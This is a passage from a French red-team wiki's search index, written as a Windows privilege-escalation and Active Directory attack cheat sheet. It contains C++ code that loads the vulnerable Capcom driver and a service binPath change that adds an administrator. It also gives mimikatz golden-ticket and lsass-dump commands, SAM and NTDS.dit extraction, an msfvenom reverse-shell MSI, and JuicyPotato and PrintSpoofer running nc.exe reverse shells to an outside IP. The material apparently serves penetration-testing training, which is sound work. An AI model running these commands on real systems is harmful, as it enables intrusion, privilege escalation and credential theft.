//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral\n    PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(\n        GetProcessHeap(),\n        HEAP_ZERO_MEMORY,\n        dwBufferSize);\n\n    if (pUserToken == NULL) {\n        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);\n        return NULL;\n    }\n\n    // Retrive token info\n    if (!GetTokenInformation(\n        hToken,\n        TokenUser,\n        pUserToken,\n        dwBufferSize,\n        &amp;dwBufferSize))\n    {\n        GetLastError();\n        return NULL;\n    }\n\n    // Check if SID is valid\n    if (!IsValidSid(pUserToken-&gt;User.Sid))\n    {\n        wprintf(L\"The owner SID is invalid.\\n\");\n        return NULL;\n    }\n\n    LPWSTR sidString;\n    ConvertSidToStringSidW(pUserToken-&gt;User.Sid, &amp;sidString);\n    return sidString;\n}\n\nULONG\nLoadDriver(HANDLE hToken)\n{\n    UNICODE_STRING DriverServiceName;\n    ULONG dwErrorCode;\n    NTSTATUS status;\n\n    typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);\n    typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);\n\n    NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtLoadDriver\");\n    RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\");\n\n    LPWSTR win7regPath = new WCHAR[MAX_PATH];\n    ZeroMemory(win7regPath, MAX_PATH);\n    LPWSTR userSidStr;\n    userSidStr = getUserSid(hToken);\n    if (userSidStr == NULL)\n    {\n        wprintf(L\"[+] Error while getting user SID\\n\");\n        CloseHandle(hToken);\n        hToken = NULL;\n    }\n\n    lstrcat(win7regPath, L\"\\\\Registry\\\\User\\\\\");\n    lstrcat(win7regPath, userSidStr);\n    lstrcat(win7regPath, L\"\\\\System\\\\CurrentControlSet\\\\CAPCOM\");\n\n    RtlInitUnicodeString(&amp;DriverServiceName, win7regPath);\n\n    status = NtLoadDriver(&amp;DriverServiceName);\n    printf(\"NTSTATUS: %08x, WinError: %d\\n\", status, GetLastError());\n\n    if (!NT_SUCCESS(status))\n        return RtlNtStatusToDosError(status);\n\n    return 0;\n}\n\nint IsTokenSystem(HANDLE tok)\n{\n    DWORD Size, UserSize, DomainSize;\n    SID *sid;\n    SID_NAME_USE SidType;\n    TCHAR UserName[64], DomainName[64];\n    TOKEN_USER *User;\n    Size = 0;\n    GetTokenInformation(tok, TokenUser, NULL, 0, &amp;Size);\n    if (!Size)\n        return 0;\n\n    User = (TOKEN_USER *)malloc(Size);\n    assert(User);\n    GetTokenInformation(tok, TokenUser, User, Size, &amp;Size);\n    assert(Size);\n    Size = GetLengthSid(User-&gt;User.Sid);\n    assert(Size);\n    sid = (SID *)malloc(Size);\n    assert(sid);\n\n    CopySid(Size, sid, User-&gt;User.Sid);\n    UserSize = (sizeof UserName / sizeof *UserName) - 1;\n    DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;\n    LookupAccountSid(NULL, sid, UserName, &amp;UserSize, DomainName, &amp;DomainSize, &amp;SidType);\n    free(sid);\n\n    printf(\"whoami:\\n%S\\\\%S\\n\", DomainName, UserName);\n    if (!_wcsicmp(UserName, L\"SYSTEM\"))\n        return 0;\n    return 1;\n}\n\nVOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)\n{\n    UINT len = 0;\n    if (attributes &amp; SE_PRIVILEGE_ENABLED)\n        len += wsprintf(szAttrbutes, TEXT(\"Enabled\"));\n    if (attributes &amp; SE_PRIVILEGE_ENABLED_BY_DEFAULT)\n        len += wsprintf(szAttrbutes, TEXT(\"Enabled by default\"));\n    if (attributes &amp; SE_PRIVILEGE_REMOVED)\n        len += wsprintf(szAttrbutes, TEXT(\"Removed\"));\n    if (attributes &amp; SE_PRIVILEGE_USED_FOR_ACCESS)\n        len += wsprintf(szAttrbutes, TEXT(\"Used for access\"));\n    if (szAttrbutes[0] == 0)\n        wsprintf(szAttrbutes, TEXT(\"Disabled\"));\n    return;\n}\n\nint GetTokenPrivilege(HANDLE tok)\n{\n    PTOKEN_PRIVILEGES ppriv = NULL;\n    DWORD dwRet = 0;\n    GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &amp;dwRet);\n    if (!dwRet)\n        return 0;\n    ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);\n    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &amp;dwRet);\n    printf(\"\\nwhoami /priv\\n\");\n    for (int i = 0; i &lt; ppriv-&gt;PrivilegeCount; i++)\n    {\n        TCHAR lpszPriv[MAX_PATH] = { 0 };\n        DWORD dwRet = MAX_PATH;\n        BOOL n = LookupPrivilegeName(NULL, &amp;(ppriv-&gt;Privileges[i].Luid), lpszPriv, &amp;dwRet);\n        printf(\"%-50ws\", lpszPriv);\n        TCHAR lpszAttrbutes[1024] = { 0 };\n        RetPrivDwordAttributesToStr(ppriv-&gt;Privileges[i].Attributes, lpszAttrbutes);\n        printf(\"%ws\\n\", lpszAttrbutes);\n    }\n    return 1;\n}\n\nBOOL EnablePriv(HANDLE hToken, LPCTSTR priv)\n{\n\n    TOKEN_PRIVILEGES tp;\n    LUID luid;\n\n    if (!LookupPrivilegeValue(NULL, priv, &amp;luid))\n    {\n        printf(\"[!]LookupPrivilegeValue error\\n\");\n        return 0;\n    }\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Luid = luid;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))\n    {\n        printf(\"[!]AdjustTokenPrivileges error\\n\");\n        return 0;\n    }\n\n    IsTokenSystem(hToken);\n    GetTokenPrivilege(hToken);\n\n    return TRUE;\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    HANDLE hToken;\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken))\n    {\n        printf(\"[!]OpenProcessToken error\\n\");\n        return 0;\n    }\n\n    EnablePriv(hToken, SE_LOAD_DRIVER_NAME);\n    LoadDriver(hToken);\n    return 0;\n}\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Print%20Operator/#telecharger-ensuite-le-driver-capcomsys-ici-httpsgithubcomfuzzysecuritycapcom-rootkitrawmasterdrivercapcomsys","title":"T\u00e9l\u00e9charger ensuite le driver Capcom.sys, ici:\u00a0https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/","title":"Server Operators","text":"<p>Le r\u00f4le de \"Server Operator\" permet une administration partielle du serveur, mais sans les privil\u00e8ges \u00e9tendus d'un \"Domain Admin\". Ce groupe donne acc\u00e8s \u00e0 divers privil\u00e8ges, dont \"SeBackupPrivilege\" et \"SeRestorePrivilege\", et permet \u00e9galement de contr\u00f4ler les services locaux du serveur.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#privileges","title":"Privileges","text":"<ul> <li><code>SeBackupPrivilege</code>: Ce privil\u00e8ge permet de contourner la v\u00e9rification des autorisations de fichier pour effectuer des op\u00e9rations de sauvegarde.    </li> <li><code>SeRestorePrivilege</code>: Ce privil\u00e8ge permet de contourner la v\u00e9rification des autorisations de fichier pour effectuer des op\u00e9rations de restauration.  </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#verifier-lutilisateur-sous-lequel-un-service-est-lance","title":"V\u00e9rifier l'utilisateur sous lequel un service est lanc\u00e9","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#pour-verifier-les-details-de-configuration-dun-service-y-compris-lutilisateur-sous-lequel-il-est-execute","title":"Pour v\u00e9rifier les d\u00e9tails de configuration d'un service, y compris l'utilisateur sous lequel il est ex\u00e9cut\u00e9 :","text":"<pre><code>sc qc $NomDeLapp # Remplacez $NomDeLapp par le nom du service que vous voulez inspecter\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#modifier-le-binaire-execute-par-un-service","title":"Modifier le binaire ex\u00e9cut\u00e9 par un service","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#si-vous-voulez-changer-le-binaire-que-le-service-execute-lors-de-son-demarrage","title":"Si vous voulez changer le binaire que le service ex\u00e9cute lors de son d\u00e9marrage :","text":"<pre><code>sc config $NomDeLapp binPath= \"cmd /c net localgroup Administrators server_adm /add\" # Remplacez $NomDeLapp et server_adm par les valeurs appropri\u00e9es`\n</code></pre> <p>Note: Faites attention lors de la modification du chemin du binaire d'un service. Une mauvaise configuration peut rendre le service ou m\u00eame le serveur inutilisable.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#arreter-et-demarrer-un-service","title":"Arr\u00eater et d\u00e9marrer un service","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#pour-arreter-un-service","title":"Pour arr\u00eater un service","text":"<pre><code>sc stop $NomDeLApp # Remplacez $NomDeLApp par le nom du service que vous voulez arr\u00eater\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Server%20Operators/#pour-demarrer-un-service","title":"Pour d\u00e9marrer un service","text":"<pre><code>sc start $NomDeLApp # Remplacez $NomDeLApp par le nom du service que vous voulez d\u00e9marrer\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Trust/Bidirectionnal/","title":"Bidirectionnal","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Trust/Bidirectionnal/#trust-bidirectionnal-child-parent","title":"trust bidirectionnal, child -&gt; parent","text":"<p>Une fois qu'on a le contr\u00f4le d'un premier DC, s'y connecter et avec mimikatz:</p> <pre><code>lsadump::trust /patch\n</code></pre> <p>Ce qui permet de trouver les SID dont nous auront besoin, ainsi que la trustkey.</p> <p>Ensuite, toujours avec mimikatz:</p> <pre><code>kerberos::golden /user:Administrator /domain:child.internal.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:bd0e4bd0efde459162c036970ef3489e /target:internal.local /ticket:C:\\Windows\\test.kirbi /service:krbtgt\n</code></pre> <p>/domain: le domaine dont nous avons le contr\u00f4le /sid: le sid du domaine dont nous avons le contr\u00f4le /sids: le sid du domaine vis\u00e9 (/!\\ on rajoute -519, qui correspond au groupe \"enterprise admin\") /target: le domaine vis\u00e9 /rc4: la trustkey</p> <p>On r\u00e9cup\u00e8re ensuite le .kirbi sur notre host et on le converti en .ccache:</p> <pre><code>impacket-ticketconverter test.kirbi test.ccache\n</code></pre> <p>On l'exporte:</p> <pre><code>export KRB5CCNAME=test.ccache\n</code></pre> <p>Nous pouvons ensuite faire le request d'un TGS sur le DC principal:</p> <pre><code>impacket-getST -k -no-pass -spn HOST/DC01 internal.local/Administrator@child.internal.local\n</code></pre> <p>On l'exporte \u00e0 son tour -&gt; profit.</p> <p>/!\\ nous sommes toujours Administrateur du domaine child, mais avec les droits sur le domaine parent, ce qui implique qu'il faut sp\u00e9cifier le nom du domaine dans certains cas, typiquement:</p> <pre><code>crackmapexec smb 192.168.210.10 --use-kcache -d child.internal.local\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Always%20Install%20Elevated/","title":"Always Install Elevated","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Always%20Install%20Elevated/#verification-du-parametre-alwaysinstallelevated","title":"V\u00e9rification du Param\u00e8tre\u00a0<code>AlwaysInstallElevated</code>","text":"<ul> <li> <p>Description :\u00a0Le param\u00e8tre\u00a0<code>AlwaysInstallElevated</code>\u00a0permet l'installation de programmes MSI avec des privil\u00e8ges \u00e9lev\u00e9s sans requ\u00e9rir explicitement les droits d'administrateur. Si activ\u00e9, il peut \u00eatre exploit\u00e9 pour obtenir une \u00e9l\u00e9vation de privil\u00e8ge.</p> </li> <li> <p>Commandes de V\u00e9rification :</p> </li> </ul> <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated \nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre> <p>Ces commandes v\u00e9rifient si le param\u00e8tre est activ\u00e9 dans les registres HKCU (HKEY_CURRENT_USER) et HKLM (HKEY_LOCAL_MACHINE). Une r\u00e9ponse \"0x1\" indique que le param\u00e8tre est activ\u00e9.  </p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Always%20Install%20Elevated/#creation-dun-reverse-shell-avec-msfvenom","title":"Cr\u00e9ation d'un Reverse Shell avec MSFVenom","text":"<ul> <li> <p>Commande : <code>msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi</code> </p> </li> <li> <p>Description :\u00a0Cette commande utilise MSFVenom pour cr\u00e9er un fichier MSI contenant un payload de reverse shell. Le fichier MSI peut ensuite \u00eatre ex\u00e9cut\u00e9 sur la machine cible pour obtenir un shell avec des privil\u00e8ges \u00e9lev\u00e9s.</p> </li> <li>D\u00e9tails :</li> <li><code>--platform windows</code>\u00a0et\u00a0<code>--arch x64</code>\u00a0sp\u00e9cifient la plateforme et l'architecture cible.</li> <li><code>--payload windows/x64/shell_reverse_tcp</code>\u00a0d\u00e9finit le payload pour un reverse shell TCP.</li> <li><code>LHOST=tun0</code>\u00a0et\u00a0<code>LPORT=6666</code>\u00a0d\u00e9finissent l'adresse et le port de l'\u00e9couteur sur l'attaquant.</li> <li><code>--encoder x64/xor</code>\u00a0et\u00a0<code>--iterations 9</code>\u00a0appliquent un encodage pour \u00e9chapper \u00e0 la d\u00e9tection.</li> <li><code>--format msi</code>\u00a0sp\u00e9cifie le format de sortie comme MSI.</li> <li><code>--out AlwaysInstallElevated.msi</code>\u00a0nomme le fichier de sortie.</li> </ul> <p>Exploitation</p> <ul> <li>Ex\u00e9cution du Fichier MSI :\u00a0Une fois le fichier MSI cr\u00e9\u00e9, il peut \u00eatre ex\u00e9cut\u00e9 sur la machine cible. Si\u00a0<code>AlwaysInstallElevated</code>\u00a0est activ\u00e9, le reverse shell sera lanc\u00e9 avec des privil\u00e8ges \u00e9lev\u00e9s.</li> </ul>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/","title":"Compte de service avec peu de privil\u00e8ges","text":"<p>Dans certains cas, un ex\u00e9cutable peut \u00eatre lanc\u00e9 avec un compte de service tout en excluant certains des privil\u00e8ges dont il dispose, par exemple :</p> <p></p> <p>Ce qui fait que nous pouvons \u00e9ventuellement avoir un contr\u00f4le de ce compte, mais sans ses privil\u00e8ges associ\u00e9s.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/#reactiver-les-privileges-avec-une-tache-planifiee","title":"R\u00e9activer les privil\u00e8ges avec une t\u00e2che planifi\u00e9e","text":"<p>L'astuce consiste en la cr\u00e9ation d'une t\u00e2che planifi\u00e9e avec ce compte (par exemple l'ex\u00e9cution d'un nouveau reverse-shell) : la t\u00e2ch\u00e9 planifi\u00e9e se lancera avec le compte de service \"nature peinture\" et donc avec ses privil\u00e8ges habituels.</p> <pre><code>$TaskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-Exec Bypass -Command `\". C:\\TOOLS\\powercat.ps1; powercat -l -p 7002 -ep`\"\"\n</code></pre> <pre><code>Register-ScheduledTask -Action $TaskAction -TaskName \"SomeTask\"\nStart-ScheduledTask -TaskName \"SomeTask\"\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/#reactiver-les-privileges-avec-fullpowersexe","title":"R\u00e9activer les privil\u00e8ges avec FullPowers.exe","text":"<p>https://github.com/itm4n/FullPowers</p> <pre><code>c:\\TOOLS&gt;FullPowers -c \"powershell -ep Bypass\"\n[+] Successfully created scheduled task. PID=9028\n[+] CreateProcessAsUser() OK\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nTry the new cross-platform PowerShell https://aka.ms/pscore6\n\nPS C:\\WINDOWS\\system32&gt; Get-ExecutionPolicy\nBypass\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Event%20log%20reader/","title":"Event log reader","text":"<p>Le groupe Event Log Reader ne permet pas de privesc en soi. Il permet par contre de lire les diff\u00e9rents logs, et notamment ceux en lien avec la cr\u00e9ation d'un process. \u00c9ventuellement, la commande permettant la cr\u00e9ation de ce process pourrait contenir un mot de passe en clair.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Event%20log%20reader/#utilisation-de-wevutilexe-pour-chercher-la-chaine-de-caractere-user-dans-les-logs","title":"Utilisation de wevutil.exe pour chercher la cha\u00eene de caract\u00e8re \"/user\" dans les logs","text":"<pre><code>wevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Named%20Pipe/","title":"Named Pipe","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Named%20Pipe/#lister-les-named-pipe","title":"Lister les Named Pipe","text":"<pre><code>pipelist.exe /accepteula\nou\ngci \\\\.\\pipe\\\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/Named%20Pipe/#voir-les-permissions-dun-pipe","title":"Voir les permissions d'un pipe","text":"<pre><code>accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/","title":"SeBackup","text":"<p>Le privil\u00e8ge SeBackup donne droit \u00e0 l'utilisateur d'effectuer des sauvegardes. Le principe pour exploiter ce privil\u00e8ge est donc d'effectuer des sauvegardes du registre/de fichiers sensibles/etc afin d'obtenir les informations voulues.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#si-le-privilege-est-disabled","title":"Si le privil\u00e8ge est \"disabled\"","text":"<p>https://github.com/giuliano108/SeBackupPrivilege</p> <pre><code>Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\n</code></pre> <pre><code>Set-SeBackupPrivilege\nGet-SeBackupPrivilege\n</code></pre> <p>Ce qui permettra d'activer le privil\u00e8ge.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#sauvegarde-du-registre","title":"Sauvegarde du registre","text":"<p>Une sauvegarde du registre va permettre de r\u00e9cup\u00e9rer les hash pr\u00e9sents dans la SAM.</p> <pre><code>reg save HKLM\\SECURITY security.save\nreg save HKLM\\SYSTEM system.save\nreg save HKLM\\SAM sam.save\n</code></pre> <p>Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash:</p> <pre><code>impacket-secretsdump -security security.save -system system.save -sam sam.save local\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#sauvegarde-du-fichier-ntdsdit","title":"Sauvegarde du fichier NTDS.dit","text":"<p>Plusieurs m\u00e9thodes sont possibles selon le contexte.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#diskshadow","title":"Diskshadow","text":"<p>Cr\u00e9ation d'un script \"backup.txt\" pour diskshadow:</p> <pre><code>set verbose on  \nset metadata C:\\Windows\\Temp\\meta.cab  \nset context clientaccessible  \nset context persistent  \nbegin backup  \nadd volume C: alias cdrive  \ncreate  \nexpose %cdrive% E:  \nend backup\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#puis-lexecuter","title":"Puis l'ex\u00e9cuter","text":"<pre><code>diskshadow /s .\\backup.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#robocopy","title":"Robocopy","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#ceci-va-creer-une-replique-de-c-sur-le-lecteur-e-les-fichiers-de-e-sont-ensuite-copiables","title":"Ceci va cr\u00e9er une r\u00e9plique de C:\\ sur le lecteur E:\\ =&gt; les fichiers de E:\\ sont ensuite copiables.","text":"<pre><code>robocopy /b E:\\Windows\\ntds . ntds.dit\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#une-fois-rapatrie-sur-notre-poste-attaquant-il-est-possible-dextraire-les-differents-hash","title":"Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash","text":"<pre><code>impacket-secretsdump -system system.save -ntds ntds.dit local\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#wbadmin","title":"Wbadmin","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#wbadmin-permet-de-creer-un-backup","title":"Wbadmin permet de cr\u00e9er un backup","text":"<pre><code>wbadmin start backup -quiet -backuptarget:\\\\dc01\\c$\\temp -include:c:\\windows\\ntds\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#on-recupere-ensuite-la-version-du-backup","title":"On r\u00e9cup\u00e8re ensuite la version du backup","text":"<pre><code>wbadmin get versions\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#puis-on-la-restore-a-un-endroit-accessible","title":"Puis on la restore \u00e0 un endroit accessible","text":"<pre><code>webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\\windows\\ntds\\ntds.dit -recoverytarget:c:\\temp -notrestoreacl\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeBackup/#une-fois-rapatrie-sur-notre-poste-attaquant-il-est-possible-dextraire-les-differents-hash_1","title":"Une fois rapatri\u00e9 sur notre poste attaquant, il est possible d'extraire les diff\u00e9rents hash","text":"<pre><code>impacket-secretsdump -system system.save -ntds ntds.dit local\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeDebug/","title":"SeDebug","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeDebug/#faire-un-dump-du-process-lsassexe-via-procdump-dans-le-cas-dune-connexion-rdp-il-est-aussi-possible-deffectuer-le-dump-du-process-depuis-le-gestionnaire-des-taches","title":"Faire un dump du process Lsass.exe via procdump (dans le cas d'une connexion RDP il est aussi possible d'effectuer le dump du process depuis le gestionnaire des t\u00e2ches)","text":"<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeDebug/#on-lance-ensuite-mimiktaz-afin-de-recuperer-les-hashs-ntlm-presents-dans-le-dump-de-lsassexe","title":"On lance ensuite mimiktaz afin de r\u00e9cup\u00e9rer les hashs NTLM pr\u00e9sents dans le dump de Lsass.exe","text":"<pre><code>mimikatz.exe\nlog\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeDebug/#sedebugprivilege-rce-en-tant-quutilisateur-system","title":"SeDebugPrivilege : RCE en tant qu'utilisateur SYSTEM","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeDebug/#on-recupere-le-pid-dun-process-lance-avec-lutilisateur-system-winlogonexe-est-un-bon-candidat","title":"On r\u00e9cup\u00e8re le PID d'un process lanc\u00e9 avec l'utilisateur SYSTEM (winlogon.exe est un bon candidat)","text":"<pre><code>tasklist\n</code></pre> <p>Ensuite, on t\u00e9l\u00e9charge le script \"psgetsys.ps1\" et on l'ex\u00e9cute, ce qui permettra de lancer une commande de notre choix en tant qu'utilisateur SYSTEM (un reverse shell, cmd.exe, powershell.exe...): https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1</p> <pre><code>.\\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,\"\")\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeImpersonate/","title":"SeImpersonate","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeImpersonate/#quest-ce-que-le-droit-seimpersonateprivilege","title":"Qu'est-ce que le droit \"SeImpersonatePrivilege\" ?","text":"<p>Ce privil\u00e8ge permet \u00e0 un processus d'adopter l'identit\u00e9 d'un autre utilisateur. Il est souvent utilis\u00e9 en conjonction avec des services Windows qui doivent s'ex\u00e9cuter avec des niveaux de privil\u00e8ges \u00e9lev\u00e9s. Un utilisateur avec ce privil\u00e8ge peut potentiellement \u00e9lever ses droits \u00e0 <code>NT AUTHORITY\\SYSTEM</code>, qui est le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows.</p> <p>Ce privil\u00e8ge permet \u00e0 un processus d'adopter l'identit\u00e9 d'un autre utilisateur. Il est souvent utilis\u00e9 en conjonction avec des services Windows qui doivent s'ex\u00e9cuter avec des niveaux de privil\u00e8ges \u00e9lev\u00e9s. Un utilisateur avec ce privil\u00e8ge peut potentiellement \u00e9lever ses droits \u00e0 <code>NT AUTHORITY\\SYSTEM</code>, qui est le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-juicypotatoexe","title":"Utilisation de JuicyPotato.exe","text":"<p>JuicyPotato est un outil qui peut abuser de ce privil\u00e8ge pour ex\u00e9cuter un code arbitraire avec des privil\u00e8ges \u00e9lev\u00e9s. Notez que cet outil ne fonctionne pas \u00e0 partir de Windows Server 2019/Windows 10 \u00e0 cause des am\u00e9liorations de s\u00e9curit\u00e9.</p> <pre><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *\n</code></pre> <pre><code>nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-printspooferexe","title":"Utilisation de PrintSpoofer.exe","text":"<p>PrintSpoofer est une autre technique qui abuse du privil\u00e8ge <code>SeImpersonatePrivilege</code> pour \u00e9lever des privil\u00e8ges :</p> <pre><code>PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n</code></pre> <pre><code>nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeImpersonate/#utilisation-de-godpotatoexe","title":"Utilisation de GodPotato.exe","text":"<p>GodPotato est encore une autre patate qui abuse du privil\u00e8ge <code>SeImpersonatePrivilege</code> pour \u00e9lever des privil\u00e8ges :</p> <pre><code>GodPotato -cmd \"cmd /c whoami\"\n</code></pre> <p>[!Astuce] GodPotato est \u00e0 privil\u00e9gier, il s'agit du plus simple et est compatible avec Windows Server 2019/Windows 10 !</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/","title":"SeTakeOwnership","text":""},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#quest-ce-que-le-droit-setakeownershipprivilege-setakeownership","title":"Qu'est-ce que le droit \"SeTakeOwnershipPrivilege\" (Setakeownership) ?","text":"<p>Ce privil\u00e8ge permet \u00e0 un utilisateur de s'approprier n'importe quel objet s\u00e9curisable sur le syst\u00e8me. Cela inclut des objets dans Active Directory, des fichiers et dossiers NTFS, des cl\u00e9s de registre, des services et des processus.</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#activation-du-droit-setakeownershipprivilege","title":"Activation du droit \"SeTakeOwnershipPrivilege\"","text":"<p>Si le droit est d\u00e9sactiv\u00e9, il peut \u00eatre activ\u00e9 en utilisant une fonction PowerShell personnalis\u00e9e comme dans l'exemple ci-dessous :</p> <pre><code>Import-Module .\\Enable-Privilege.ps1  # Charge le module qui permet d'activer des privil\u00e8ges \nEnable-Privilege 'SeTakeOwnershipPrivilege'  # Active le privil\u00e8ge SeTakeOwnership`\n</code></pre> <p>Note: <code>Enable-Privilege.ps1</code> : lien vers le .ps1 \u00e0 rajouter</p>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-un-fichier-ou-dossier","title":"S'approprier un fichier ou dossier","text":"<p>Pour prendre la propri\u00e9t\u00e9 d'un fichier ou d'un dossier :</p> <pre><code>takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'  # Prend la propri\u00e9t\u00e9 du fichier`\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#modifier-les-acls-access-control-lists","title":"Modifier les ACLs (Access Control Lists)","text":"<p>Une fois que vous \u00eates propri\u00e9taire de l'objet, vous pouvez \u00e9galement modifier ses ACLs :</p> <pre><code>$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name  # Obtient le nom de l'utilisateur actuel \nicacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant \"$user:F\"  # Attribue des droits 